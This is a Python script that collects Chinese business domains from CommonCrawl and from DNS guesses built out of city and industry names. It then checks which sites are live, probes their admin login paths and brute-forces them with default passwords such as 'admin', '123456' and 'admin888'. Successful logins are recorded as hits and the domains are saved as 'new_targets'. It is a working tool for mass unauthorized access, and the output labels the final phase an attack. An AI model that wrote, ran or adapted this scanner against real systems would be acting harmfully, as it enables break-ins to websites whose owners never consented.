import subprocess, json, re, socket, threading, time

# Phase 0: Load blacklist
blacklist = set()
try:
    with open('/tmp/blacklist_domains.txt') as f:
        for line in f: blacklist.add(line.strip())
except: pass

domains = set()

# ============================================
# Phase 1: CommonCrawl
# ============================================
print('[1/4] CommonCrawl collection...')
CC = 'https://index.commoncrawl.org/CC-MAIN-2024-30-index'
queries = [
    'url=*.com.cn/*&filter=status:200&output=json&limit=50',
    'url=*.cn/*&filter=encoding:gb2312&output=json&limit=30',
    'url=*/news.asp*&filter=status:200&output=json&limit=20',
    'url=*/products.asp*&filter=status:200&output=json&limit=20',
]
for q in queries:
    try:
        r = subprocess.run(['curl','-sk','--connect-timeout','15',CC+'?'+q],
            capture_output=True,text=True,timeout=20)
        for line in r.stdout.strip().split('\n'):
            try:
                d = json.loads(line)
                m = re.search(r'https?://([^/]+)', d['url'])
                if m: domains.add(m.group(1))
            except: pass
    except: pass

# ============================================
# Phase 2: DNS Domain Generation
# ============================================
print('[2/4] DNS generation...')
cities = ['beijing','shanghai','tianjin','guangzhou','shenzhen','hangzhou','nanjing',
    'wuhan','chengdu','qingdao','dalian','xiamen','suzhou','wuxi','fuzhou',
    'ningbo','changsha','zhengzhou','hefei','xian','kunming','shenyang']
biz = ['jixie','gongcheng','jianzhu','dianqi','dianlan','zhoucheng','gangtie',
    'yeya','jingmi','jidian','jichuang','wujin','jiancai','dianji','yibiao']

found_dns = 0
def check_dns(domain):
    global found_dns
    try:
        ip = socket.gethostbyname(domain)
        if ip:
            domains.add(domain)
            found_dns += 1
    except: pass

threads = []
for c in cities:
    for b in biz:
        if found_dns >= 15: break
        for ext in ['.com','.com.cn','.cn']:
            t = threading.Thread(target=check_dns, args=(c+b+ext,))
            t.start()
            threads.append(t)
for t in threads: t.join(3)

# ============================================
# Phase 3: Dedupe + Filter
# ============================================
print('[3/4] Dedupe...')
new_domains = sorted(domains - blacklist)
print('Total collected:', len(domains))
print('After dedupe:', len(new_domains))

# ============================================
# Phase 4: Live check + Admin scan
# ============================================
print('[4/4] Live check + attack...')
hits = []
lock = threading.Lock()

def check_domain(domain):
    try:
        # Quick live check
        r = subprocess.run(['curl','-sk','--connect-timeout','3','--max-time','5',
            'http://'+domain,'-o','/dev/null','-w','%{http_code}:%{size_download}'],
            capture_output=True,text=True,timeout=6)
        parts = r.stdout.strip().split(':')
        code = parts[0]
        size = int(parts[1]) if len(parts) > 1 else 0
        
        if code in ['200','301','302'] and size > 500:
            # Test admin paths + default login
            name = domain.split('.')[0]
            for path in ['/admin','/admin/login','/login','/admin.php']:
                try:
                    r2 = subprocess.run(['curl','-sk','-c','/tmp/ck_'+domain.replace('.','_'),
                        'http://'+domain+path,'-o','/dev/null','-w','%{http_code}:%{size_download}'],
                        capture_output=True,text=True,timeout=5)
                    p = r2.stdout.strip().split(':')
                    if len(p) >= 2 and p[0] == '200' and 300 < int(p[1]) < 50000:
                        for pw in ['admin','123456','admin123','admin888',name,name+'123']:
                            r3 = subprocess.run(['curl','-sk','-b','/tmp/ck_'+domain.replace('.','_'),
                                '-L','http://'+domain+path,'-X','POST',
                                '-d','username=admin&password='+pw,
                                '-w','%{size_download}:%{url_effective}','-o','/dev/null'],
                                capture_output=True,text=True,timeout=6)
                            s3 = r3.stdout.strip().split(':')
                            s3_size = s3[0]
                            s3_url = ':'.join(s3[1:]) if len(s3) > 1 else ''
                            if path not in s3_url or int(s3_size) > int(p[1]) + 500:
                                with lock:
                                    print(domain+path+' admin/'+pw+' -> '+s3_size+'B')
                                    hits.append((domain,path,pw))
                                break
                except: pass
    except: pass

threads = []
for domain in new_domains[:50]:
    t = threading.Thread(target=check_domain, args=(domain,))
    t.start()
    threads.append(t)
for t in threads: t.join(15)

# Save results
with open('/tmp/new_targets.txt','w') as f:
    for d in sorted(domains): f.write(d+'\n')
print('Done. Hits:', len(hits))
